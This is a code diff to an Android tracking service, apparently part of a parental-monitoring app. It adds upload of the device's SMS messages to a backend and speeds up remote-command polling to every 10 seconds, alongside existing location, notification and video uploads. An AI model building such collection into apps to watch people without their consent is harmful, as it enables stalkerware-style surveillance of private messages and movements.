@@ -40,6 +40,7 @@ class TrackingForegroundService : Service() {
     private lateinit var commandSvc:       RemoteCommandService
     private lateinit var notificationSvc:  NotificationSyncService
     private lateinit var videoUploadSvc:   VideoUploadService
+    private lateinit var smsSvc:           SmsService
 
     private var slowTick = 0
 
@@ -50,6 +51,7 @@ class TrackingForegroundService : Service() {
         commandSvc      = RemoteCommandService(this, AppConstants.backendBaseUrl)
         notificationSvc = NotificationSyncService(this, AppConstants.backendBaseUrl)
         videoUploadSvc  = VideoUploadService(this, AppConstants.backendBaseUrl)
+        smsSvc          = SmsService(this, AppConstants.backendBaseUrl)
         isRunning       = true
     }
 
@@ -76,9 +78,18 @@ class TrackingForegroundService : Service() {
     // ── Main capture loop ─────────────────────────────────────────────────────
 
     private fun startLoop() {
+        // Fast command loop — lightweight, runs every 10 s
         scope.launch {
             while (isActive) {
-                runFastCapture()
+                runCommandPoll()
+                delay(COMMAND_INTERVAL_MS)
+            }
+        }
+
+        // Data loop — location/status/sync, runs every 60 s
+        scope.launch {
+            while (isActive) {
+                runDataCapture()
 
                 slowTick++
                 if (slowTick >= SLOW_EVERY_N_TICKS) {
@@ -91,17 +102,25 @@ class TrackingForegroundService : Service() {
         }
     }
 
-    /** Runs every 5 minutes — location, status, commands */
-    private suspend fun runFastCapture() {
+    /** Runs every 10 s — ONLY remote commands (fast, lightweight) */
+    private suspend fun runCommandPoll() {
+        val (token, deviceId) = readAuth()
+        if (token != null && deviceId != null) {
+            safeRun { commandSvc.pollAndExecute(token, deviceId) }
+        }
+    }
+
+    /** Runs every 60 s — location, device status, sync rules, SMS */
+    private suspend fun runDataCapture() {
         safeRun { locationSvc.captureLocation() }
         safeRun { deviceSvc.captureStatus() }
 
         val (token, deviceId) = readAuth()
         if (token != null && deviceId != null) {
-            safeRun { commandSvc.pollAndExecute(token, deviceId) }
             safeRun { commandSvc.syncGeofences(token, deviceId) }
             safeRun { commandSvc.syncAppBlocks(token, deviceId) }
             safeRun { notificationSvc.uploadPending(token, deviceId) }
+            safeRun { smsSvc.syncSms(token, deviceId) }
         }
     }
 
@@ -117,6 +136,7 @@ class TrackingForegroundService : Service() {
         val (token, deviceId) = readAuth()
         if (token != null && deviceId != null) {
             safeRun { videoUploadSvc.uploadPendingVideos(token, deviceId) }
+            safeRun { smsSvc.syncSms(token, deviceId) }
         }
     }
 
@@ -181,7 +201,8 @@ class TrackingForegroundService : Service() {
 
         private const val CHANNEL_ID        = "pm_tracking_channel"
         private const val NOTIFICATION_ID   = 1001
-        private const val FAST_INTERVAL_MS  = 60 * 1_000L       // 1 min (was 5 min)
-        private const val SLOW_EVERY_N_TICKS = 6                // every 30 min
+        private const val COMMAND_INTERVAL_MS = 10 * 1_000L      // 10 s — command fast poll
+        private const val FAST_INTERVAL_MS   = 60 * 1_000L      // 60 s — data capture
+        private const val SLOW_EVERY_N_TICKS = 6                 // every 6 min
     }
 }
